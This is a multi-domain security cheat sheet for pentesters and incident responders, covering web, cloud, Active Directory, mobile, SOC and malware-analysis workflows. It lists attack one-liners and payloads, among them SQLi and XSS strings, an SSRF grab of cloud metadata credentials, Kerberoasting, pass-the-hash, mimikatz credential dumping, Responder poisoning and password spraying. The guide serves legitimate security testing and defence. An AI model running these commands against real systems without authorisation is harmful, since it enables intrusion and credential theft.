# CYBER SECURITY WORKFLOW CHEAT SHEET — ALL DOMAINS
*Field manual for pentesters, red teamers, SOC analysts, and IR responders*

---
---

# 🌐 DOMAIN 1: WEB PENTESTING

## 1. 🧭 End-to-End Workflow
```
Recon → Enumeration → Vuln Mapping → Exploitation → Post-Exploit → PrivEsc → Reporting
```
1. Passive recon (OSINT, subdomains, tech stack)
2. Active enumeration (dirs, params, endpoints)
3. Vulnerability identification (SQLi, XSS, IDOR, auth issues)
4. Exploitation (get shell / data / access)
5. Post-exploitation (pivot, escalate, persist)
6. Document & report

## 2. 🔍 Enumeration Phase
```bash
whois domain.com; dig domain.com ANY
subfinder -d domain.com -o subs.txt
httpx -l subs.txt -status-code -title -tech-detect
nmap -sC -sV -p80,443,8080,8443 TARGET
whatweb TARGET
gobuster dir -u https://TARGET -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,bak
ffuf -u https://TARGET/FUZZ -w wordlist.txt -mc 200,301,403
```
**Look for:** exposed `.git`, `.env`, backup files, admin panels, API docs (`/swagger`, `/api-docs`), verbose error messages, tech versions (via headers/Wappalyzer).

## 3. 💥 Attack Phase
- **SQLi:** `' OR 1=1-- -` → confirm with `sqlmap -u URL --batch --dbs`
- **XSS:** `<script>alert(1)</script>` / `<img src=x onerror=alert(1)>`
- **IDOR:** increment/decrement IDs, swap UUIDs across roles
- **SSRF:** `?url=http://169.254.169.254/latest/meta-data/`
- **File upload:** `.php.jpg`, null byte, magic-byte polyglot, content-type spoof
- **LFI→RCE:** `php://filter/convert.base64-encode/resource=`, log poisoning via User-Agent
- **Auth bypass:** JWT `alg:none`, weak secret, session fixation

## 4. ⬆️ PrivEsc / Escalation Paths
- Web shell → Linux privesc: `sudo -l`, `find / -perm -4000`, GTFOBins
- Web shell → Windows privesc: unquoted paths, AlwaysInstallElevated, token impersonation
- App-level: horizontal (user→user via IDOR) → vertical (user→admin via role param tampering)

## 5. 🧠 Decision Tree
```
Port 80/443 open        → enumerate web app, check tech stack
robots.txt/sitemap found → check disallowed paths for hidden endpoints
Login form found        → test SQLi, default creds, brute-force lockout policy
File upload found        → test extension/MIME/magic-byte bypass
API endpoints found      → check for IDOR, missing auth, verbose errors
.git exposed             → git-dumper, extract source, search for secrets
Admin panel found        → default creds, brute force, check for CVEs by version
WAF detected             → try case mixing, encoding, comment-splitting bypass
```

## 6. 🛠️ Toolkit
| Tool | Purpose | Command | When |
|---|---|---|---|
| Burp Suite | Proxy/fuzz | Intercept→Repeater/Intruder | Every web target |
| sqlmap | SQLi automation | `sqlmap -u URL --batch --dbs` | Confirmed/suspected SQLi |
| gobuster/ffuf | Dir/param fuzz | `gobuster dir -u URL -w list` | Hidden content discovery |
| nuclei | Automated CVE scan | `nuclei -u URL -t cves/` | Fast vuln sweep |
| git-dumper | Extract exposed .git | `git-dumper URL/.git out/` | Exposed git repo |

## 7. 🚨 Common Misconfigurations
- Default credentials on admin panels
- Verbose error messages leaking stack traces/paths
- CORS misconfig (`Access-Control-Allow-Origin: *` with credentials)
- Missing rate limiting on login/reset endpoints
- Outdated CMS/plugins (WordPress, Drupal) with public CVEs
- Debug mode left on in production

## 8. ⚡ Speed Hacks
- Run `httpx` + `nuclei` pipeline across subdomain list for instant vuln triage
- Use Burp's Match & Replace to auto-bypass simple header checks
- Keep a personal wordlist of past-found hidden params/paths
- Automate recon: `subfinder | httpx | nuclei` one-liner chains

## 9. 📊 Reporting
- **Document:** endpoint, payload used, request/response, impact, reproduction steps
- **Severity:** Critical (RCE/auth bypass/full DB dump) → High (SQLi/SSRF/stored XSS) → Medium (reflected XSS/IDOR limited scope) → Low (info disclosure/missing headers)
- Include screenshots + curl PoC for every finding

---
---

# 🛡️ DOMAIN 2: SOC / INCIDENT RESPONSE

## 1. 🧭 End-to-End Workflow
```
Detection → Triage → Containment → Investigation → Eradication → Recovery → Lessons Learned
```

## 2. 🔍 Enumeration / Triage Phase
```bash
# Windows
Get-WinEvent -LogName Security -MaxEvents 100
Get-Process | Sort-Object CPU -Descending
netstat -ano | findstr ESTABLISHED

# Linux
last -a; who
ps aux --sort=-%cpu
netstat -tulnp; ss -tulnp
journalctl -xe --since "1 hour ago"
```
**Look for:** unusual parent-child process trees, unexpected outbound connections, new admin/service accounts, disabled logging, unfamiliar scheduled tasks.

## 3. 💥 Investigation Phase (Attack Confirmation)
- Correlate SIEM alert with raw logs (EDR, firewall, proxy, DNS)
- Check IOC against threat intel (VirusTotal, AbuseIPDB, AlienVault OTX)
- Timeline reconstruction: first-seen artifact → lateral movement → objective
- Memory/disk triage if malware suspected (see Domain 3)

## 4. ⬆️ Escalation / Scope Expansion
- Identify blast radius: which hosts/accounts touched?
- Check for lateral movement (RDP, PsExec, WMI, SSH keys reused)
- Check for privilege escalation on compromised host
- Check for persistence mechanisms (registry run keys, cron, services, scheduled tasks)

## 5. 🧠 Decision Tree
```
Alert = malware detection      → isolate host, collect sample, submit to sandbox
Alert = brute force            → check source IP reputation, lock account, block IP
Alert = data exfil (large egress) → isolate host, check destination, preserve pcap
Alert = privilege escalation    → check for known CVE, review recent account changes
Alert = suspicious login (new geo/impossible travel) → force password reset, revoke sessions
Unknown process spawning cmd/powershell → EDR isolate, dump process, analyze
```

## 6. 🛠️ Toolkit
| Tool | Purpose | Command | When |
|---|---|---|---|
| Splunk/ELK | SIEM correlation | search queries by index/sourcetype | Every alert triage |
| Velociraptor | Live endpoint forensics | VQL queries via GUI/CLI | Host triage at scale |
| Sysmon | Detailed Windows logging | check Event ID 1,3,7,11,13 | Process/network/file tracking |
| Wireshark/tcpdump | Packet analysis | `tcpdump -i eth0 -w cap.pcap` | Network-based alerts |
| YARA | Malware pattern matching | `yara rules.yar file` | Sample classification |

## 7. 🚨 Common Misconfigurations / Gaps
- Logging disabled or retention too short
- No EDR on critical servers
- Default/shared admin credentials across systems
- No network segmentation (flat network = fast lateral movement)
- Alerts not tuned → analyst fatigue → missed real incidents

## 8. ⚡ Speed Hacks
- Pre-built SIEM dashboards for top 10 attack patterns
- Automate IOC enrichment via TI API integration (auto-tag known-bad IPs/hashes)
- Use playbooks (SOAR) for repetitive triage steps (auto-isolate, auto-ticket)
- Keep a "known-good" baseline of normal process/network behavior per host group

## 9. 📊 Reporting
- **Document:** timeline, IOCs, affected systems, root cause, actions taken
- **Severity:** Critical (active breach/data exfil) → High (confirmed compromise, contained) → Medium (suspicious activity, no confirmed impact) → Low (false positive/benign anomaly)
- Post-incident: update detection rules, patch root cause, brief stakeholders

---
---

# 🦠 DOMAIN 3: MALWARE ANALYSIS

## 1. 🧭 End-to-End Workflow
```
Acquisition → Static Analysis → Dynamic Analysis → Behavioral Mapping → Reporting/Signatures
```

## 2. 🔍 Enumeration / Static Analysis Phase
```bash
file sample.exe
strings -n 8 sample.exe | grep -iE "http|cmd|reg|\.dll"
exiftool sample.exe
sha256sum sample.exe   # check against VirusTotal
peframe sample.exe     # PE metadata, imports, packers
capa sample.exe        # capability detection
```
**Look for:** suspicious imports (`WinExec`, `VirtualAlloc`, `CreateRemoteThread`), packer signatures (UPX, Themida), embedded URLs/IPs, digital signature validity.

## 3. 💥 Dynamic Analysis Phase
- Detonate in isolated sandbox (FLARE-VM, Cuckoo, ANY.RUN, joesandbox)
- Monitor with:
```bash
Procmon         # file/registry/process activity
Process Hacker  # live process tree, handles
Wireshark       # C2 traffic capture
INetSim/FakeNet # fake network services to trigger callbacks
```
**Look for:** dropped files, registry persistence writes, outbound C2 beacons, process injection, privilege escalation attempts.

## 4. ⬆️ Behavioral Mapping (Escalation of Understanding)
- Map to MITRE ATT&CK techniques (T1055 injection, T1547 persistence, etc.)
- Identify C2 protocol (HTTP/DNS/custom TCP) and beacon interval
- Extract config (XOR/RC4 decode embedded C2 domains, keys)
- Determine capability: ransomware, infostealer, RAT, loader, worm

## 5. 🧠 Decision Tree
```
Packed binary detected       → unpack first (UPX -d, or dynamic unpack via debugger)
Anti-VM checks present       → patch checks or use bare-metal/better sandbox
Network callback observed    → capture C2, extract IOC, block at firewall
Registry persistence found   → note key/value for IOC + cleanup script
Ransomware behavior (mass encrypt) → isolate immediately, do NOT let it finish
```

## 6. 🛠️ Toolkit
| Tool | Purpose | Command | When |
|---|---|---|---|
| Ghidra/IDA | Static disassembly | GUI import → analyze | Deep code analysis |
| x64dbg | Dynamic debugging | attach/step through | Unpacking, anti-debug bypass |
| Procmon | Live activity monitor | filter by process name | Behavior discovery |
| Cuckoo Sandbox | Automated detonation | submit sample via API | Bulk/first-pass triage |
| YARA | Signature creation/matching | `yara rule.yar sample` | Classification, hunting |

## 7. 🚨 Common Weak Points Exploited by Malware
- Unpatched software (exploit kits)
- Macro-enabled Office docs with auto-run
- Weak endpoint protection / no application whitelisting
- Users with local admin rights (enables persistence/injection)

## 8. ⚡ Speed Hacks
- Run `capa` + `strings` first for instant triage before deep RE
- Use VirusTotal API for hash reputation before manual analysis
- Maintain YARA rule library for fast reclassification of variants
- Automate IOC extraction pipeline (regex for IPs/domains/URLs from strings output)

## 9. 📊 Reporting
- **Document:** hash, family/classification, capabilities, IOCs (IP/domain/hash/mutex), MITRE ATT&CK mapping
- **Severity:** Critical (ransomware/wiper/active C2) → High (RAT/infostealer with exfil) → Medium (dropper/loader, not yet executed payload) → Low (adware/PUP)
- Deliver YARA/Sigma rules for detection + IOC feed for blocking

---
---

# ☁️ DOMAIN 4: CLOUD SECURITY (AWS/Azure/GCP)

## 1. 🧭 End-to-End Workflow
```
Recon (Account/Service Discovery) → Enumeration (Permissions/Resources) → Exploitation (Misconfig Abuse) → PrivEsc (IAM) → Persistence → Reporting
```

## 2. 🔍 Enumeration Phase
```bash
# AWS
aws sts get-caller-identity
aws iam list-users; aws iam list-roles
aws s3 ls; aws s3api list-buckets
aws ec2 describe-instances
scoutsuite --provider aws        # full config audit

# Azure
az account show
az ad user list; az role assignment list
az storage account list

# GCP
gcloud auth list
gcloud projects list
gcloud iam service-accounts list
```
**Look for:** public S3 buckets, overly permissive IAM policies (`*:*`), unused access keys, public snapshots, exposed metadata endpoints.

## 3. 💥 Exploitation Phase
- **SSRF → Cloud metadata:** `curl http://169.254.169.254/latest/meta-data/iam/security-credentials/`
- **Public S3 bucket:** `aws s3 ls s3://bucket-name --no-sign-request`
- **Overprivileged IAM role assumed via EC2** → extract temp creds → pivot
- **Exposed secrets in code/CI (GitHub Actions, Terraform state)** → grep for `AKIA`, `-----BEGIN PRIVATE KEY-----`
- **Misconfigured Lambda/Functions with excess permissions** → invoke and abuse role

## 4. ⬆️ PrivEsc / Escalation Paths
```bash
# AWS IAM privesc checks (use tool: PMapper / Cloudsplaining)
aws iam get-policy --policy-arn ARN
aws iam simulate-principal-policy --policy-source-arn ARN --action-names "*"
# common paths: iam:PassRole + lambda:CreateFunction, iam:CreatePolicyVersion, ec2:RunInstances w/ instance profile
```
- Azure: Global Admin via misconfigured PIM, service principal secret exposure
- GCP: `roles/owner` via overly broad service account impersonation

## 5. 🧠 Decision Tree
```
Public bucket found          → check contents for secrets/PII, note as finding
IAM policy with wildcard (*)  → attempt privesc chain (PMapper/Cloudsplaining)
Metadata endpoint reachable   → extract role creds via SSRF
CI/CD pipeline exposed        → check for hardcoded secrets, build injection
Unused/old access keys found  → flag for rotation, check last-used timestamp
Cross-account role trust broad → check for confused deputy risk
```

## 6. 🛠️ Toolkit
| Tool | Purpose | Command | When |
|---|---|---|---|
| ScoutSuite | Multi-cloud config audit | `scoutsuite --provider aws` | Initial full-account assessment |
| PMapper | AWS IAM privesc graphing | `pmapper graph create` | Mapping privesc paths |
| Pacu | AWS exploitation framework | `pacu` interactive modules | Active AWS pentest |
| CloudSploit/Prowler | Compliance & misconfig scan | `prowler aws` | Benchmark/compliance check |
| TruffleHog | Secret scanning in repos | `trufflehog git REPO_URL` | Find leaked cloud creds |

## 7. 🚨 Common Misconfigurations
- S3 buckets public read/write
- IAM policies with `"Action":"*","Resource":"*"`
- Security groups open to `0.0.0.0/0` on sensitive ports
- Secrets hardcoded in Lambda env vars / Terraform state files
- MFA not enforced on privileged accounts

## 8. ⚡ Speed Hacks
- Run ScoutSuite/Prowler first for instant misconfig overview before manual digging
- Automate secret scanning across all repos with TruffleHog/Gitleaks in CI
- Maintain a checklist of top 10 IAM privesc patterns per cloud provider
- Use `jq` to quickly filter large JSON output from cloud CLI commands

## 9. 📊 Reporting
- **Document:** resource ARN/ID, misconfiguration, exploitation path, data exposed
- **Severity:** Critical (public data exposure/full account takeover) → High (privesc path to admin) → Medium (overly permissive but not directly exploitable) → Low (best-practice deviation, no direct risk)
- Recommend least-privilege IAM redesign + automated compliance scanning

---
---

# 🖥️ DOMAIN 5: NETWORK / INTERNAL AD PENTESTING

## 1. 🧭 End-to-End Workflow
```
External/Internal Recon → Host Enumeration → Initial Foothold → AD Enumeration → Lateral Movement → Domain PrivEsc → Domain Admin → Reporting
```

## 2. 🔍 Enumeration Phase
```bash
nmap -sn 10.10.10.0/24                  # host discovery
nmap -p- -T4 -oN full TARGET
enum4linux -a TARGET
crackmapexec smb 10.10.10.0/24 -u '' -p ''   # null session sweep
BloodHound-python -u user -p pass -d domain.local -ns TARGET -c All
```
**Look for:** null SMB sessions, exposed shares, misconfigured GPOs, Kerberoastable/AS-REP roastable accounts, weak service account passwords.

## 3. 💥 Attack / Foothold Phase
```bash
# Responder for LLMNR/NBT-NS poisoning
responder -I eth0

# Kerberoasting
GetUserSPNs.py domain/user:pass -dc-ip DC_IP -request

# AS-REP Roasting
GetNPUsers.py domain/ -usersfile users.txt -no-pass -dc-ip DC_IP

# Pass-the-Hash
crackmapexec smb TARGET -u user -H NTHASH
```

## 4. ⬆️ PrivEsc / Lateral Movement (AD-specific)
```bash
# BloodHound analysis: find shortest path to Domain Admin
# Common paths: unconstrained delegation, ACL abuse, GPO abuse, DCSync rights

secretsdump.py domain/user:pass@DC_IP                  # dump hashes if DA
mimikatz "sekurlsa::logonpasswords"                    # live creds
psexec.py domain/user:pass@TARGET                      # lateral movement
```

## 5. 🧠 Decision Tree
```
Null SMB session works        → enum4linux, check shares/users
LLMNR/NBT-NS enabled          → Responder for hash capture → crack offline
Kerberoastable account found  → request TGS, crack offline (hashcat -m 13100)
Unconstrained delegation host → coerce auth (PrinterBug/PetitPotam) → capture DA ticket
Local admin on host via CME   → dump SAM/LSASS, check for reused creds domain-wide
BloodHound shows ACL abuse path → execute abuse chain (e.g., GenericAll on user)
```

## 6. 🛠️ Toolkit
| Tool | Purpose | Command | When |
|---|---|---|---|
| Nmap | Host/service discovery | `nmap -sC -sV -p- TARGET` | Every network engagement |
| CrackMapExec/NetExec | AD mass enum/exploit | `nxc smb TARGET -u user -p pass` | Credential spraying, lateral movement |
| BloodHound | AD attack path mapping | ingest + GUI query | Find privesc path to DA |
| Responder | Hash capture via poisoning | `responder -I eth0` | LLMNR/NBT-NS present |
| Impacket suite | AD protocol exploitation | `secretsdump.py`, `psexec.py` | Hash dumping, lateral movement |

## 7. 🚨 Common Misconfigurations
- LLMNR/NBT-NS enabled (default in many orgs)
- Kerberoastable service accounts with weak passwords
- Unconstrained delegation on non-DC servers
- Overly broad ACLs (GenericAll/WriteDACL on privileged objects)
- Domain Admins used for routine login (creds cached everywhere)

## 8. ⚡ Speed Hacks
- Run `nxc smb` password spray across whole subnet in one command
- Feed BloodHound data immediately after any domain enum — always check shortest DA path first
- Crack Kerberoast/AS-REP hashes in parallel with continued enumeration (don't block)
- Keep a local wordlist of seasonal/company-pattern passwords for spraying

## 9. 📊 Reporting
- **Document:** attack path (host→host→DA), credentials/technique used at each hop, business impact
- **Severity:** Critical (Domain Admin achieved) → High (lateral movement/credential dumping) → Medium (initial foothold only) → Low (info disclosure, no access gained)
- Recommend: disable LLMNR/NBT-NS, tiered admin model, LAPS, delegation review

---
---

# 📱 DOMAIN 6: MOBILE APP PENTESTING (Android/iOS)

## 1. 🧭 End-to-End Workflow
```
Recon → Static Analysis → Dynamic Analysis → Network Traffic Analysis → Backend/API Testing → Reporting
```

## 2. 🔍 Enumeration / Static Analysis
```bash
# Android
apktool d app.apk -o output/
jadx-gui app.apk                     # decompile to Java
grep -r "API_KEY\|secret\|password" output/

# iOS
otool -L app.ipa                     # check linked libraries
class-dump app                       # extract Obj-C headers
```
**Look for:** hardcoded API keys/secrets, insecure storage (SharedPreferences/plist unencrypted), debuggable flag enabled, weak/no certificate pinning, exported activities/intents (Android).

## 3. 💥 Dynamic Analysis / Attack Phase
```bash
frida -U -f com.app.package -l script.js --no-pause     # hook/bypass SSL pinning
objection explore                                        # runtime manipulation
adb shell pm list packages
adb logcat | grep -i app                                 # runtime log leaks
mitmproxy -p 8080                                        # intercept traffic (after cert bypass)
```
- Test for insecure IPC (exported activities/broadcast receivers on Android)
- Test for local SQLite DB with sensitive plaintext data
- Test biometric auth bypass (weak local validation)

## 4. ⬆️ Escalation / Backend Exploitation
- Once traffic intercepted → test backend API same as Web Pentesting workflow (IDOR, auth bypass, injection)
- Check JWT/token storage & expiry handling on client
- Test for API rate-limiting bypass via mobile client-specific headers

## 5. 🧠 Decision Tree
```
APK obtained              → static analysis first (apktool/jadx) before dynamic
App has cert pinning       → bypass via Frida/objection before traffic interception
Hardcoded secrets found    → test validity against backend directly
Exported Android component → test intent injection / unauthorized access
Root/jailbreak detection   → bypass via Frida scripts or patched binary
Backend API reachable      → pivot to full web API pentest workflow
```

## 6. 🛠️ Toolkit
| Tool | Purpose | Command | When |
|---|---|---|---|
| JADX | APK decompilation | `jadx-gui app.apk` | Static source review |
| Frida | Runtime instrumentation | `frida -U -f pkg -l script.js` | SSL pinning bypass, hooking |
| MobSF | Automated mobile security scan | upload APK/IPA to web UI | Fast first-pass triage |
| Objection | Runtime mobile exploration | `objection explore` | Bypass protections, explore memory |
| Burp Suite | Intercept mobile traffic | proxy + cert install on device | API/backend testing |

## 7. 🚨 Common Misconfigurations
- No SSL/certificate pinning (or easily bypassed)
- Sensitive data stored unencrypted locally
- Debuggable/backup-allowed flags left enabled in production builds
- Overly permissive exported components (Android)
- API keys/secrets embedded directly in app binary

## 8. ⚡ Speed Hacks
- Run MobSF first for automated baseline before manual deep-dive
- Keep a standard Frida script library (SSL pinning bypass, root detection bypass) ready to reuse
- Always check `strings` on APK/IPA binary early for quick secret discovery
- Test backend API in parallel with client-side analysis to save time

## 9. 📊 Reporting
- **Document:** vulnerable component/screen, technique, data exposed, reproduction steps (with Frida script if used)
- **Severity:** Critical (backend RCE/auth bypass via mobile API) → High (hardcoded secrets/insecure storage of sensitive data) → Medium (missing pinning/exported components) → Low (debuggable flag/verbose logs)
- Include both client-side and backend findings in unified report

---
---

# 🎯 UNIVERSAL SPEED-RUN CHECKLIST (any engagement, first 10 minutes)
1. Identify target type (web/network/cloud/mobile/host) → route to correct domain workflow above
2. Run baseline recon tool for that domain (nmap / ScoutSuite / MobSF / BloodHound ingest)
3. Check top 3 misconfiguration list for that domain first — highest ROI
4. Follow decision tree branch matching first finding
5. Document as you go — don't wait until the end to start notes
6. Escalate/pivot only after confirming initial foothold is stable

---
*Field manual compiled for professional security operations — adapt payloads/commands to environment-specific constraints and scope of authorization.*
